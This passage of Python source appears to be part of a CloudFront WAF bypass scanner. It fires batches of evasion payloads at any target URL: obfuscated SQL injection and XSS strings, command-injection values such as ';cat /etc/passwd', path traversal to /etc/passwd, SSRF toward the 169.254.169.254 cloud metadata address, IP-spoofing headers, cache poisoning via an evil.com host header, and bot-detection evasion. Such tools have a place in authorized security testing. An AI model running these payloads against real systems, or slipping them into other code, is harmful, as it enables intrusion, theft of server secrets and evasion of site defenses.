                        'waf': waf_name,
                        'confidence': min(confidence, 100),
                        'indicators': matched_indicators
                    })
            
            # Sort by confidence
            detected_wafs.sort(key=lambda x: x['confidence'], reverse=True)
            
            for waf in detected_wafs:
                severity = 'HIGH' if waf['confidence'] >= 70 else 'MEDIUM' if waf['confidence'] >= 40 else 'LOW'
                result = {
                    'technique': f"WAF Detection: {waf['waf'].upper()}",
                    'bypass': False,
                    'status': resp.status_code,
                    'reason': f"Confidence: {waf['confidence']}% - {', '.join(waf['indicators'][:3])}",
                    'severity': severity,
                    'category': 'WAF_DETECTION',
                    'details': waf
                }
                results.append(result)
                print(f"  [+] Detected WAF: {waf['waf'].upper()} (Confidence: {waf['confidence']}%)")
            
            if not detected_wafs:
                print("  [*] No known WAF signatures detected")
                
        except Exception as e:
            logger.error(f"WAF detection error: {e}")
        
        return results
    
    def _detect_cdn(self) -> List[Dict[str, Any]]:
        """Detect CDN provider"""
        results = []
        print("  [*] Detecting CDN...")
        
        try:
            resp = safe_request(self.target, timeout=self.timeout, allow_redirects=True)
            if not resp:
                return results
            
            headers_lower = {k.lower(): v.lower() for k, v in resp.headers.items()}
            server_header = headers_lower.get('server', '').lower()
            
            detected_cdns = []
            
            for cdn_name, signatures in CDN_SIGNATURES.items():
                confidence = 0
                matched = []
                
                for sig_header in signatures.get('headers', []):
                    if sig_header.lower() in headers_lower:
                        confidence += 40
                        matched.append(f"Header: {sig_header}")
                
                for sig_server in signatures.get('server', []):
                    if sig_server.lower() in server_header:
                        confidence += 40
                        matched.append(f"Server: {sig_server}")
                
                # Check DNS CNAME records
                try:
                    import socket
                    cname = socket.gethostbyname_ex(self.domain)[0]
                    for cdn_cname in signatures.get('cnames', []):
                        if cdn_cname in cname:
                            confidence += 30
                            matched.append(f"CNAME: {cdn_cname}")
                except:
                    pass
                
                if confidence > 0:
                    detected_cdns.append({
                        'cdn': cdn_name,
                        'confidence': min(confidence, 100),
                        'indicators': matched
                    })
            
            detected_cdns.sort(key=lambda x: x['confidence'], reverse=True)
            
            for cdn in detected_cdns:
                result = {
                    'technique': f"CDN Detection: {cdn['cdn'].upper()}",
                    'bypass': False,
                    'status': resp.status_code,
                    'reason': f"Confidence: {cdn['confidence']}%",
                    'severity': 'INFO',
                    'category': 'CDN_DETECTION',
                    'details': cdn
                }
                results.append(result)
                print(f"  [+] Detected CDN: {cdn['cdn'].upper()} (Confidence: {cdn['confidence']}%)")
            
            if not detected_cdns:
                print("  [*] No known CDN detected")
                
        except Exception as e:
            logger.error(f"CDN detection error: {e}")
        
        return results

    # ============================================================================
    # HEADER-BASED SCANS
    # ============================================================================
    
    def _test_header_injection(self) -> List[Dict[str, Any]]:
        """Test X-Forwarded-For, X-Real-IP spoofing"""
        results = []
        
        # Internal/trusted IP addresses
        trusted_ips = [
            '127.0.0.1',
            '10.0.0.1',
            '172.16.0.1', 
            '192.168.1.1',
            '169.254.169.254',  # AWS metadata
            '::1',  # IPv6 localhost
            'localhost',
        ]
        
        header_types = [
            'X-Forwarded-For',
            'X-Real-IP',
            'X-Client-IP',
            'X-Remote-IP',
            'X-Remote-Addr',
            'X-Originating-IP',
            'True-Client-IP',
            'CF-Connecting-IP',
            'Fastly-Client-IP',
        ]
        test_cases = []
        for header in header_types:
            for ip in ['127.0.0.1', '10.0.0.1', '169.254.169.254']:
                test_cases.append({'headers': {header: ip}, 'technique': f'{header}: {ip}'})
        return self._batch_test(test_cases)
    
    def _test_origin_header_bypass(self) -> List[Dict[str, Any]]:
        """Manipulate Origin/Referer headers - optimized batch"""
        test_cases = [
            {'headers': {'Origin': 'null'}, 'technique': 'Origin: null'},
            {'headers': {'Origin': f'https://{self.domain}'}, 'technique': 'Origin: Same domain'},
            {'headers': {'Origin': 'https://localhost'}, 'technique': 'Origin: localhost'},
            {'headers': {'Referer': f'https://{self.domain}/'}, 'technique': 'Referer: Same origin'},
            {'headers': {'Referer': 'https://www.google.com/'}, 'technique': 'Referer: Google'},
            {'headers': {'Origin': 'null', 'Referer': 'null'}, 'technique': 'Origin+Referer: null'},
        ]
        return self._batch_test(test_cases)
    
    def _test_custom_header_fuzzing(self) -> List[Dict[str, Any]]:
        """Test for headers that bypass WAF rules - optimized batch"""
        test_cases = [
            {'headers': {'X-Custom-IP-Authorization': '127.0.0.1'}, 'technique': 'X-Custom-IP-Authorization'},
            {'headers': {'X-Requested-With': 'XMLHttpRequest'}, 'technique': 'X-Requested-With: XMLHttpRequest'},
            {'headers': {'X-Debug': 'true'}, 'technique': 'X-Debug: true'},
            {'headers': {'X-Skip-WAF': 'true'}, 'technique': 'X-Skip-WAF: true'},
            {'headers': {'X-Internal': 'true'}, 'technique': 'X-Internal: true'},
            {'headers': {'X-Rewrite-URL': '/'}, 'technique': 'X-Rewrite-URL'},
        ]
        return self._batch_test(test_cases)

    # ============================================================================
    # ENCODING BYPASS SCANS
    # ============================================================================
    
    def _test_case_manipulation(self) -> List[Dict[str, Any]]:
        """Test mixed case payloads - optimized batch"""
        case_paths = ['/Admin', '/ADMIN', '/AdMiN', '/admin/', '/.htaccess', '/.HTACCESS']
        test_cases = [
            {'headers': {}, 'path': path, 'technique': f'Case Manipulation: {path}'}
            for path in case_paths
        ]
        return self._batch_test(test_cases)
    
    def _test_comment_injection(self) -> List[Dict[str, Any]]:
        """Insert comments in payloads - optimized batch"""
        comment_paths = [
            "/?id=1'/**/OR/**/1=1",
            "/?id=1'/*!OR*/1=1",
            "/?id=1'--+-",
            "/?q=<scr<!---->ipt>",
        ]
        test_cases = [
            {'headers': {}, 'path': path, 'technique': f'Comment Injection: {path[:30]}'}
            for path in comment_paths
        ]
        return self._batch_test(test_cases)
    
    def _test_whitespace_manipulation(self) -> List[Dict[str, Any]]:
        """Use tabs, newlines, null bytes - optimized batch"""
        whitespace_paths = [
            "/?id=1%09OR%091=1",
            "/?id=1%0aOR%0a1=1",
            "/?id=1%00OR%001=1",
            "/admin%00.html",
        ]
        test_cases = [
            {'headers': {}, 'path': path, 'technique': f'Whitespace: {path[:30]}'}
            for path in whitespace_paths
        ]
        return self._batch_test(test_cases)

    # ============================================================================
    # HTTP METHOD & PROTOCOL SCANS
    # ============================================================================
    
    def _test_http_method_override(self) -> List[Dict[str, Any]]:
        """Test X-HTTP-Method-Override headers"""
        results = []
        
        override_headers = [
            {'X-HTTP-Method-Override': 'PUT', 'X-Technique': 'X-HTTP-Method-Override: PUT'},
            {'X-HTTP-Method-Override': 'DELETE', 'X-Technique': 'X-HTTP-Method-Override: DELETE'},
            {'X-HTTP-Method-Override': 'PATCH', 'X-Technique': 'X-HTTP-Method-Override: PATCH'},
            {'X-HTTP-Method': 'PUT', 'X-Technique': 'X-HTTP-Method: PUT'},
            {'X-Method-Override': 'DELETE', 'X-Technique': 'X-Method-Override: DELETE'},
            {'_method': 'PUT', 'X-Technique': '_method: PUT (Rails)'},
            {'X-HTTP-Method-Override': 'CONNECT', 'X-Technique': 'X-HTTP-Method-Override: CONNECT'},
            {'X-HTTP-Method-Override': 'TRACE', 'X-Technique': 'X-HTTP-Method-Override: TRACE'},
        ]
        
        for headers in override_headers:
            # Try as both GET and POST
            for method in ['GET', 'POST']:
                result = self._test_request(headers, method=method)
                if result and result['bypass']:
                    results.append(result)
                    print(f"  [✓] BYPASS: {result['technique']} | {result['reason']} | {result['severity']}")
        
        return results
    
    def _test_http_parameter_pollution(self) -> List[Dict[str, Any]]:
        """Duplicate parameters to confuse WAF parsing - optimized batch"""
        hpp_paths = [
            "/?id=1&id=2",
            "/?id=safe&id=1'OR'1'='1",
            "/?cmd=ls&cmd=;cat /etc/passwd",
            "/?file=valid.txt&file=../../../etc/passwd",
        ]
        test_cases = [
            {'headers': {}, 'path': path, 'technique': f'HTTP Parameter Pollution: {path[:30]}'}
            for path in hpp_paths
        ]
        return self._batch_test(test_cases)

    # ============================================================================
    # PROTOCOL-LEVEL SCANS
    # ============================================================================
    
    def _test_chunked_transfer(self) -> List[Dict[str, Any]]:
        """Split payloads across chunks - optimized batch"""
        test_cases = [
            {'headers': {'Transfer-Encoding': 'chunked'}, 'method': 'POST', 'technique': 'Chunked: Standard'},
            {'headers': {'Transfer-Encoding': 'chunked', 'Content-Length': '0'}, 'method': 'POST', 'technique': 'Chunked + CL: 0'},
            {'headers': {'Transfer-Encoding': ' chunked'}, 'method': 'POST', 'technique': 'Chunked: Leading space'},
        ]
        return self._batch_test(test_cases)
    
    def _test_http_pipelining(self) -> List[Dict[str, Any]]:
        """Test WAF handling of pipelined requests - optimized batch"""
        test_cases = [
            {'headers': {'Connection': 'keep-alive'}, 'technique': 'Connection: keep-alive'},
            {'headers': {'Connection': 'Keep-Alive', 'Keep-Alive': 'timeout=5, max=100'}, 'technique': 'Keep-Alive header'},
        ]
        return self._batch_test(test_cases)

    # ============================================================================
    # CACHE & CONTROL SCANS
    # ============================================================================
    
    def _test_cache_poisoning(self) -> List[Dict[str, Any]]:
        """Test WAF/cache interaction vulnerabilities - optimized batch"""
        cache_buster = f"?cb={int(time.time())}"
        test_cases = [
            {'headers': {'X-Original-URL': '/admin'}, 'path': cache_buster, 'technique': 'X-Original-URL cache poison'},
            {'headers': {'X-Rewrite-URL': '/admin'}, 'path': cache_buster, 'technique': 'X-Rewrite-URL cache poison'},
            {'headers': {'X-Forwarded-Host': 'evil.com'}, 'path': cache_buster, 'technique': 'X-Forwarded-Host cache poison'},
        ]
        return self._batch_test(test_cases)

    # ============================================================================
    # PAYLOAD-BASED BYPASS SCANS
    # ============================================================================
    
    def _test_sqli_bypass(self) -> List[Dict[str, Any]]:
        """WAF-evading SQL injection payloads - optimized batch"""
        sqli_payloads = [
            "/?id=1'/**/OR/**/1=1--",
            "/?id=1'/*!50000OR*/1=1--",
            "/?id=1'%0aOR%0a1=1--",
            "/?id=1'oR'1'='1",
            "/?id=/*!12345UNION*//*!12345SELECT*/1",
            "/?id=-1'+UnIoN+SeLeCt+1,2,3--",
        ]
        test_cases = [
            {'headers': {}, 'path': path, 'technique': f'SQLi Bypass: {path[:30]}'}
            for path in sqli_payloads
        ]
        return self._batch_test(test_cases)
    
    def _test_xss_bypass(self) -> List[Dict[str, Any]]:
        """WAF-evading cross-site scripting payloads - optimized batch"""
        xss_payloads = [
            "/?q=<svg/onload=alert(1)>",
            "/?q=<ScRiPt>alert(1)</ScRiPt>",
            "/?q=<svg/onload=&#97;&#108;&#101;&#114;&#116;(1)>",
            "/?q=<scr<script>ipt>alert(1)</script>",
            "/?q=\"><script>alert(1)</script>",
        ]
        test_cases = [
            {'headers': {}, 'path': path, 'technique': f'XSS Bypass: {path[:30]}'}
            for path in xss_payloads
        ]
        return self._batch_test(test_cases)
    
    def _test_command_injection_bypass(self) -> List[Dict[str, Any]]:
        """OS command injection evasion - optimized batch"""
        cmd_payloads = [
            "/?cmd=;ls",
            "/?cmd=|ls",
            "/?cmd=`ls`",
            "/?cmd=$(ls)",
            "/?cmd=;ls${IFS}-la",
        ]
        test_cases = [
            {'headers': {}, 'path': path, 'technique': f'Command Injection: {path[:30]}'}
            for path in cmd_payloads
        ]
        return self._batch_test(test_cases)
    
    def _test_path_traversal_bypass(self) -> List[Dict[str, Any]]:
        """Directory traversal evasion - optimized batch"""
        traversal_paths = [
            "/../../../etc/passwd",
            "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "/%252e%252e/%252e%252e/etc/passwd",
            "/..%c0%af..%c0%af/etc/passwd",
            "/../../../etc/passwd%00",
        ]
        test_cases = [
            {'headers': {}, 'path': path, 'technique': f'Path Traversal: {path[:30]}'}
            for path in traversal_paths
        ]
        return self._batch_test(test_cases)
    
    def _test_ssrf_bypass(self) -> List[Dict[str, Any]]:
        """Server-side request forgery evasion - optimized batch"""
        ssrf_payloads = [
            "/?url=http://127.0.0.1",
            "/?url=http://localhost",
            "/?url=http://[::1]",
            "/?url=http://2130706433",
            "/?url=http://169.254.169.254/latest/meta-data/",
        ]
        test_cases = [
            {'headers': {}, 'path': path, 'technique': f'SSRF Bypass: {path[:30]}'}
            for path in ssrf_payloads
        ]
        return self._batch_test(test_cases)

    # ============================================================================
    # RATE LIMIT & THRESHOLD TESTING
    # ============================================================================
    
    def _test_rate_limit_detection(self) -> List[Dict[str, Any]]:
        """Identify request thresholds"""
        results = []
        print("  [*] Testing rate limit detection...")
        
        try:
            # Quick burst test
            responses = []
            for i in range(10):
                resp = safe_request(
                    self.target,
                    timeout=self.timeout,
                    allow_redirects=False
                )
                if resp:
                    responses.append({
                        'status': resp.status_code,
                        'size': len(resp.content),
                        'headers': dict(resp.headers)
                    })
                # No delay - burst mode
            
            # Analyze responses for rate limiting indicators
            rate_limit_detected = False
            for i, r in enumerate(responses):
                # Check for rate limit status codes
                if r['status'] in [429, 503]:
                    rate_limit_detected = True
                    result = {
                        'technique': f'Rate Limit Detection: Request {i+1}',
                        'bypass': False,
                        'status': r['status'],
                        'reason': f'Rate limited after {i+1} requests',
                        'severity': 'INFO',
                        'category': 'RATE_LIMIT'
                    }
                    results.append(result)
                    print(f"  [+] Rate limit detected at request {i+1} (Status: {r['status']})")
                    break
                
                # Check for rate limit headers
                rate_headers = ['x-ratelimit-limit', 'x-ratelimit-remaining', 'retry-after', 'x-rate-limit']
                for hdr in rate_headers:
                    if hdr in [h.lower() for h in r['headers'].keys()]:
                        result = {
                            'technique': f'Rate Limit Header: {hdr}',
                            'bypass': False,
                            'status': r['status'],
                            'reason': f'Rate limit header present: {hdr}',
                            'severity': 'INFO',
                            'category': 'RATE_LIMIT'
                        }
                        results.append(result)
            
            if not rate_limit_detected:
                print("  [*] No rate limiting detected in burst of 10 requests")
                
        except Exception as e:
            logger.error(f"Rate limit test error: {e}")
        
        return results

    # ============================================================================
    # MISCELLANEOUS SCANS
    # ============================================================================
    
    def _test_ipv6_bypass(self) -> List[Dict[str, Any]]:
        """Check if IPv6 bypasses WAF rules"""
        results = []
        
        try:
            # Try to resolve IPv6 address
            ipv6_addrs = socket.getaddrinfo(self.domain, 443, socket.AF_INET6)
            if ipv6_addrs:
                ipv6_addr = ipv6_addrs[0][4][0]
                print(f"  [+] IPv6 address found: {ipv6_addr}")
                
                # Test direct IPv6 connection
                ipv6_url = f"{self.scheme}://[{ipv6_addr}]/"
                headers = {
                    'Host': self.domain,
                    'X-Technique': f'IPv6 Direct: [{ipv6_addr}]'
                }
                
                try:
                    resp = safe_request(ipv6_url, headers=headers, timeout=self.timeout)
                    if resp:
                        bypass_result = self._is_bypass(resp)
                        if bypass_result['bypass']:
                            result = {
                                'technique': f'IPv6 Bypass: {ipv6_addr}',
                                'bypass': True,
                                'status': resp.status_code,
                                'reason': bypass_result['reason'],
                                'severity': bypass_result['severity']
                            }
                            results.append(result)
                            print(f"  [✓] BYPASS: IPv6 | {bypass_result['reason']} | {bypass_result['severity']}")
                except Exception:
                    pass
            else:
                print("  [*] No IPv6 address found for target")
        except Exception as e:
            logger.debug(f"IPv6 bypass test error: {e}")
        
        return results
    
    def _test_bot_detection_evasion(self) -> List[Dict[str, Any]]:
        """Test fingerprinting countermeasures - optimized batch"""
        test_cases = [
            {'headers': {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0'}, 'technique': 'UA: Chrome Windows'},
            {'headers': {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) Safari/604.1'}, 'technique': 'UA: Safari iPhone'},
            {'headers': {'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)'}, 'technique': 'UA: Googlebot'},
            {'headers': {'User-Agent': ''}, 'technique': 'UA: Empty'},
            {'headers': {'User-Agent': 'curl/7.68.0'}, 'technique': 'UA: Curl'},
            {'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
                'Accept': 'text/html,application/xhtml+xml',
                'Accept-Language': 'en-US,en;q=0.9',
                'Sec-Fetch-Dest': 'document',
            }, 'technique': 'Full browser headers'},
        ]
        return self._batch_test(test_cases)
    
    def _test_api_endpoint_discovery(self) -> List[Dict[str, Any]]:
        """Find unprotected API routes - optimized batch"""
        api_paths = [
            '/api/', '/api/v1/', '/api/v2/', '/graphql', '/swagger/', 
            '/swagger.json', '/api/health', '/health', '/metrics', 
            '/actuator/', '/actuator/health', '/debug/',
        ]
        test_cases = [
            {'headers': {}, 'path': path, 'technique': f'API Discovery: {path}'}
            for path in api_paths
        ]
        results = []
        batch_results = self._batch_test(test_cases)
        
        for r in batch_results:
            r['category'] = 'API_DISCOVERY'
            results.append(r)
            
        return results


def main():
    """Standalone scanner with comprehensive error handling"""
    from argparse import ArgumentParser
    import json
    import sys
    from .error_handler import setup_logging
    
    parser = ArgumentParser(description='CloudFront WAF Bypass Scanner')
    parser.add_argument('target', help='Target URL')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads')
    parser.add_argument('-d', '--delay', type=float, default=0.2, help='Delay between requests')
    parser.add_argument('--timeout', type=int, default=5, help='Request timeout in seconds')
    parser.add_argument('-o', '--output', help='Output JSON file')
    parser.add_argument('--log-file', help='Log file path')
    parser.add_argument('--log-level', default='INFO', 
                       choices=['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL'],
                       help='Logging level')
    args = parser.parse_args()
    
    # Setup logging
    setup_logging(args.log_file, args.log_level)
    
    try:
        # Initialize scanner
        scanner = CloudFrontBypasser(args.target, args.threads, args.delay, args.timeout)
        
        # Run scan
        results = scanner.scan()
        
        # Display results
        print(f"\n{'='*60}")
        print(f"[+] Scan Complete: Found {len(results)} findings")
        print(f"{'='*60}\n")
        
        if results:
            # Group by severity
            critical = [r for r in results if r.get('severity') == 'CRITICAL']
            high = [r for r in results if r.get('severity') == 'HIGH']
            medium = [r for r in results if r.get('severity') == 'MEDIUM']
            low = [r for r in results if r.get('severity') == 'LOW']
            info = [r for r in results if r.get('severity') == 'INFO']
            
            # Count actual bypasses
            bypasses = [r for r in results if r.get('bypass', False)]
            detections = [r for r in results if r.get('category') in ['WAF_DETECTION', 'CDN_DETECTION', 'API_DISCOVERY']]
            
            print(f"📊 Summary:")
            print(f"   Total Findings: {len(results)}")
            print(f"   Actual Bypasses: {len(bypasses)}")
            print(f"   WAF/CDN Detections: {len(detections)}")
            print()
            
            if critical:
                print(f"🔴 CRITICAL ({len(critical)}):")
                for r in critical:
                    print(f"  - {r['technique']}")
                    print(f"    Reason: {r['reason']}")
            
            if high:
                print(f"\n🟠 HIGH ({len(high)}):")
                for r in high:
                    print(f"  - {r['technique']}")
                    print(f"    Reason: {r['reason']}")
            
            if medium:
                print(f"\n🟡 MEDIUM ({len(medium)}):")
                for r in medium:
                    print(f"  - {r['technique']}")
                    print(f"    Reason: {r['reason']}")
            
            if low:
                print(f"\n🔵 LOW ({len(low)}):")
                for r in low[:5]:  # Show first 5
                    print(f"  - {r['technique']}")
                if len(low) > 5:
                    print(f"  ... and {len(low) - 5} more")
            
            if info:
                print(f"\nℹ️  INFO ({len(info)}):")
                for r in info[:10]:  # Show first 10
                    print(f"  - {r['technique']}")
                if len(info) > 10:
                    print(f"  ... and {len(info) - 10} more")
        else:
            print("✅ No bypasses found - target is properly protected")
        
        # Save results
        if args.output:
            with open(args.output, 'w') as f:
                json.dump(results, f, indent=2)
            print(f"\n[+] Results saved to {args.output}")
        
        # Return appropriate exit code
        sys.exit(0 if len(results) == 0 else 1)
    
    except InvalidTargetError as e:
        print(f"[!] Invalid target: {e}")
        logger.error(f"Invalid target: {e}")
        sys.exit(2)
    
    except BaselineFailedError as e:
        print(f"[!] Baseline failed: {e}")
        logger.error(f"Baseline failed: {e}")
        sys.exit(3)
    
    except TargetUnreachableError as e:
        print(f"[!] Target unreachable: {e}")
        logger.error(f"Target unreachable: {e}")
        sys.exit(4)
    
    except ScanInterruptedError as e:
        print(f"\n[!] Scan interrupted: {e}")
        logger.warning(f"Scan interrupted: {e}")
        sys.exit(130)  # Standard exit code for SIGINT
    
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user")
        logger.warning("Scan interrupted by user (Ctrl+C)")
        sys.exit(130)
    
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        logger.exception("Unexpected error during scan")
        sys.exit(1)


if __name__ == '__main__':
    main()